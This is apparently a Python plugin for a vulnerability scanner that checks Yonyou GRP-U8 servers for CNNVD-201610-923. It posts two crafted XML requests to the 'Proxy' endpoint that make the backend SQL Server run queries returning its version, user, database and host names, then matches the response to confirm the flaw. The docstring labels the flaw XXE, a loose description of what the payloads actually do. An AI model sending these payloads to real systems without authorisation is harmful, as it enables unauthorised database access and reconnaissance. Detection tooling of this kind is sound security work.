#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re

cnnvd_201610_923_payloads = [
    {
        'path': 'Proxy',
        'data': 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
    },
    {
        'path': 'Proxy',
        'data': 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
    }
]

def cnnvd_201610_923_scan(self, clients):
    '''  
        用友GRP-u8存在XXE漏洞, 该漏洞源于应用程序解析XML输入时没有禁止外部实体的加载, 导致可加载外部SQL语句
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name + 'GRP-U8',
        'vul_type': 'SQLinject/RCE',
        'vul_id': 'CNNVD-201610-923',
    }

    for payload in cnnvd_201610_923_payloads:
        path = payload['path']
        data = payload['data']
        
        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        version_re = r'column[1-4]{1}="Microsoft SQL Server \d{1,5} -.*Copyright.*Microsoft Corporation.*"'

        if (re.search(version_re, res.text, re.I|re.M|re.S|re.U)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
